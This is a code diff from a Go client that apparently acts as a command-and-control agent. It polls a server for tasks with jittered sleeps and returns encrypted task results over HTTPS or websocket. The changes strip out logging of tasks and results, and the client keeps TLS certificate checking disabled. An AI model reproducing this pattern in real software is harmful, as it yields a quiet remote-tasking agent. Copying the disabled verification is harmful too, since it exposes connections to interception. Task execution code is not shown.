@@ -29,13 +29,11 @@ func httpsMode() {
 	go func() {
 		// were checked in and now we can poll for tasks
 		for {
-
 			t, err := client.ClientHttpsPollHandler(client.Client, taskUrl)
 			if err != nil {
 				client.ClientInterrupt <- os.Interrupt
 				break
 			}
-			log.Println(t)
 			if len(t) == 0 {
 				time.Sleep(time.Second * time.Duration(client.Client.Jitter))
 				continue
@@ -52,14 +50,13 @@ func httpsMode() {
 					client.ClientInterrupt <- os.Interrupt
 					break
 				}
-				log.Println(result)
+				//log.Println(result)
 				// encrypt marshaled task result.
 				encryptedTaskResult, err := client.Client.EncryptMessageWithPubKey(result.ToBytes())
 				if err != nil {
 					client.ClientInterrupt <- os.Interrupt
 					break
 				}
-				log.Println(encryptedTaskResult)
 				d := data.Message{
 					MessageType: "TaskResult",
 					MessageData: encryptedTaskResult,
@@ -98,8 +95,6 @@ func websocketMode() {
 	socketUrl := fmt.Sprintf("wss://%s:%s/socketClient", client.ServerHostName, client.ServerPort)
 	websocket.DefaultDialer.TLSClientConfig = &tls.Config{
 		InsecureSkipVerify: true,
-		//RootCAs:            client.Client.ClientCaCertPool,
-		//Certificates:       []tls.Certificate{client.Client.ClientTLSCertificate},
 	}
 	c, _, err := websocket.DefaultDialer.Dial(socketUrl, http.Header{
 		"shared-secret": []string{client.ServerSecret},
@@ -113,7 +108,7 @@ func websocketMode() {
 	for {
 		select {
 		case <-client.ClientInterrupt:
-			log.Println("Received SIGINT interrupt signal. Closing all pending connections")
+			//log.Println("Received SIGINT interrupt signal. Closing all pending connections")
 			err := client.Client.WSConn.WriteMessage(websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
 			if err != nil {
 				log.Println("Error during closing websocket:", err)
